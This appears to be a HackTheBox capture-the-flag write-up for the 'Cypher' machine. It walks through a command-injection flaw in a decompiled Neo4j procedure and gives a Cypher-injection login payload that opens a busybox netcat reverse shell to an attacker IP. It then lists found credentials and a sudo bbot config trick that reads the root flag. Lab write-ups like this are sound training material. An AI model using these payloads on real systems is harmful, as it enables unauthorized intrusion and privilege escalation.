# Cypher - HTB Write-up
## Port 80 

### Directory enumeration
`❯ gobuster dir --url $url/api -t 100 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

`/auth - Method not allowed`

In the directory `/testing` we find a `.jar` file, decompile it:
```java
public class CustomFunctions {
  @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
  @Description("Returns the HTTP status code for the given URL as a string")
  public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://"))
      url = "https://" + url; 
    String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
    System.out.println("Command: " + Arrays.toString((Object[])command));
    Process process = Runtime.getRuntime().exec(command);
    BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    StringBuilder errorOutput = new StringBuilder();
    String line;
    while ((line = errorReader.readLine()) != null)
      errorOutput.append(line).append("\n"); 
    String statusCode = inputReader.readLine();
    System.out.println("Status code: " + statusCode);
    boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
    if (!exited) {
      process.destroyForcibly();
      statusCode = "0";
      System.err.println("Process timed out after 10 seconds");
    } else {
      int exitCode = process.exitValue();
      if (exitCode != 0) {
        statusCode = "0";
        System.err.println("Process exited with code " + exitCode);
      } 
    } 
    if (errorOutput.length() > 0)
      System.err.println("Error output:\n" + errorOutput.toString()); 
    return Stream.of(new StringOutput(statusCode));
  }
  
  public static class StringOutput {
    public String statusCode;
    
    public StringOutput(String statusCode) {
      this.statusCode = statusCode;
    }
  }
}
```

It seems that the login page might be using this... so we can try to hijack it.

This is the command that it runs to get the HTTP response.
```shell
/bin/sh -c curl -s -o /dev/null --connect-timeout 1 -w %{http_code} <URL>
```

Lets try to call the procedure `custom.getUrlStatusCode` using that we previously found in the code.

- Payload for RCE / RevShell
```shell
{"username":"a' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.x.x:80;busybox nc 10.10.14.115 1337 -e sh;#\") YIELD statusCode AS a RETURN a;//","password":"hello"}
```

This will result in a process like this
```shell
neo4j       2357    1822  0 13:05 ?        00:00:00 /bin/sh -c curl -s -o /dev/null --connect-timeout 1 -w %{http_code} http://10.10.x.x:80;busybox nc 10.10.14.115 1337 -e sh;#
```

## Interesting finds as neo4j user
```shell
neo4j@cypher:/home/graphasm$ cat user.txt 
cat: user.txt: Permission denied
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml 
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

neo4j@cypher:~$ cat .bash_history 
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK

neo4j@cypher:~/data$ cat dbms/auth.ini 
neo4j:SHA-256,6a4277a4653a8536cff2d6f44fc698621e237d33a0fa36a57c55fb3bfead7b48,3d19d683dc15384a6cae9dc840740e93116cae7b0786b9dfee4dbbacbc13a65c,1024:
```

## Interesting finds as graphasm
```shell
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```


## Privilege Escalation
```shell
graphasm@cypher:~$ sudo /usr/local/bin/bbot --help
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope]
            [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo] [-em MODULE [MODULE ...]]
            [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v]
            [-d] [-s] [--force] [-y] [--dry-run] [--current-preset] [--current-preset-full] [-o DIR]
            [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]
            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version]
            [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]

Bighuge BLS OSINT Tool

options:
  -h, --help            show this help message and exit

Target:
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]
                        Targets to seed the scan
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        What's considered in-scope (by default it's the same as --targets)
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        Don't touch these things
  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope

Presets:
  -p [PRESET ...], --preset [PRESET ...]
                        Enable BBOT preset(s)
  -c [CONFIG ...], --config [CONFIG ...]
                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'
  -lp, --list-presets   List available presets.
```

As you can see we can use a config file with `-c`. Also the option `-d` enables debugging. 

Maybe we can use this to read `/root/flag.txt`? Let's try it:

```shell
sudo /usr/local/bin/bbot -c /root/root.txt -d --dry-run
```

`--dry-run` is used here so we don't make any modification and just show a emulation of the process.

```shell
[DBUG] internal.excavate: Including Submodule URLExtractor
[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: c551b54954fc40****
```